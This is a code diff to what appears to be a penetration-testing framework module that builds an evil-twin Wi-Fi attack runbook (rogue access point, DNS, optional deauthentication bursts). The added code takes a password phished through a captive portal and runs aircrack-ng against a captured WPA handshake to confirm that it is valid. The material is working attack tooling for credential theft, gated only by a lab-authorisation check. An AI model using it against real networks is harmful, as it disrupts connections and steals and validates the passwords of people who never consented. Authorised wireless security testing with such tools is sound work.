@@ -1,6 +1,7 @@
 """Emit an evil-twin lab runbook: hostapd + dnsmasq + optional deauth reference.
 
 Does not auto-run daemons unless `launch_deauth_orchestrator` is true (spawns subprocess).
+Includes optional verify-on-capture mode to validate captured passphrases.
 
 Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
 """
@@ -40,6 +41,13 @@ class Exploit(Exploit):
         advanced=True,
     )
     deauth_packets = OptInteger(32, "Packets per aireplay -0 burst when launching")
+    verify_on_capture = OptBool(
+        False,
+        "Verify candidate password against captured handshake after portal capture",
+        advanced=True,
+    )
+    handshake_capture_path = OptString("", "Path to handshake capture (.cap/.pcap) for verification")
+    captured_password = OptString("", "Candidate password captured via portal")
 
     def run(self) -> None:
         require_authorised_lab()
@@ -99,3 +107,30 @@ class Exploit(Exploit):
             ]
             print_status("Launching: {}".format(" ".join(cmd)))
             subprocess.run(cmd, check=False)
+
+        if self.verify_on_capture:
+            hs = Path(str(self.handshake_capture_path).strip())
+            if not hs.exists():
+                print_error("verify_on_capture enabled, but handshake_capture_path not found.")
+                return
+            if not str(self.captured_password):
+                print_error("verify_on_capture enabled, but captured_password is empty.")
+                return
+            aircrack = shutil.which("aircrack-ng")
+            if not aircrack:
+                print_error("aircrack-ng not found for verify_on_capture.")
+                return
+
+            wordlist_path = out / "captured_password.wordlist.txt"
+            wordlist_path.write_text(str(self.captured_password) + "\n", encoding="utf-8")
+            verify_cmd = [aircrack, "-w", str(wordlist_path), str(hs)]
+            if self.target_bssid:
+                verify_cmd[1:1] = ["-b", self.target_bssid]
+
+            print_status("Verify-on-capture: {}".format(" ".join(verify_cmd)))
+            result = subprocess.run(verify_cmd, capture_output=True, text=True, check=False)
+            output = (result.stdout or "") + "\n" + (result.stderr or "")
+            if "KEY FOUND!" in output:
+                print_success("verify_on_capture: captured password is valid for handshake.")
+            else:
+                print_error("verify_on_capture: password did not validate against handshake.")
